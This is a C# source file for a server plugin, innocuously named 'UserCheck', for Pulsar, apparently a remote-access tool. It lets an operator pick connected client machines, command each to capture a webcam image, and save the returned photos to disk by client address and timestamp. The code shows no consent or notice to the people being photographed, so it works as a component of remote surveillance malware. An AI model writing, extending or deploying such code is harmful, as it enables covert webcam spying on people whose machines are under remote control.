using System;
using System.Collections.Generic;
using System.IO;
using Pulsar.Server.Plugins;
using Pulsar.Server.Networking;
using Pulsar.Server.Messages;

namespace Pulsar.Plugin.UserCheck.Server
{
    public class Plugin : IServerPlugin
    {
        public string Name => "UserCheck Plugin";
        public Version Version => new Version(1, 0, 0);
        public string Description => "Captures webcam images from clients and saves them to disk";
        public string Type => "Utility";
        public bool AutoLoadToClients => false;

        private IServerContext _context;
        private ResponseHandler _responseHandler;

        public void Initialize(IServerContext context)
        {
            _context = context;
            _responseHandler = new ResponseHandler(context);

            UniversalPluginResponseHandler.ResponseReceived += _responseHandler.HandleResponse;

            _context.AddClientContextMenuItem(
                "UserCheck Plugin",
                "Get Webcam Image",
                OnGetWebcamImage
            );

            _context.Log($"{Name} v{Version} loaded successfully");
        }

        private void OnGetWebcamImage(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                // Maybe show a message, but since no UI, just log
                _context.Log("No clients selected for webcam capture.");
                return;
            }

            foreach (var client in clients)
            {
                SendGetWebcamCommand(client);
            }

            _context.Log($"Sent get-webcam command to {clients.Count} client(s)");
        }

        private void SendGetWebcamCommand(Client client)
        {
            try
            {
                PushSender.ExecuteUniversalCommand(
                    client,
                    "UserCheckClient",
                    "get-webcam",
                    null // no parameters
                );

                _context.Log($"Sent get-webcam to {client.EndPoint}");
            }
            catch (Exception ex)
            {
                _context.Log($"Error sending get-webcam to {client.EndPoint}: {ex.Message}");
            }
        }
    }

    internal class ResponseHandler
    {
        private readonly IServerContext _context;

        public ResponseHandler(IServerContext context)
        {
            _context = context;
        }

        public void HandleResponse(PluginResponse response)
        {
            if (response.PluginId != "UserCheckClient")
                return;

            try
            {
                if (response.Success && response.Data != null && response.Data.Length > 0)
                {
                    SaveImageToDisk(response.Data, response.Client.EndPoint.ToString());
                    _context.Log($"Saved webcam image from {response.Client.EndPoint}");
                }
                else
                {
                    _context.Log($"Failed to get webcam image from {response.Client.EndPoint}: {response.Message}");
                }
            }
            catch (Exception ex)
            {
                _context.Log($"Error processing webcam response from {response.Client.EndPoint}: {ex.Message}");
            }
        }

        private void SaveImageToDisk(byte[] imageData, string clientKey)
        {
            string directory = Path.Combine(Directory.GetCurrentDirectory(), "WebcamImages");
            Directory.CreateDirectory(directory);

            string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            string filename = $"{clientKey.Replace(":", "_")}_{timestamp}.jpg";
            string filePath = Path.Combine(directory, filename);

            File.WriteAllBytes(filePath, imageData);
        }
    }
}
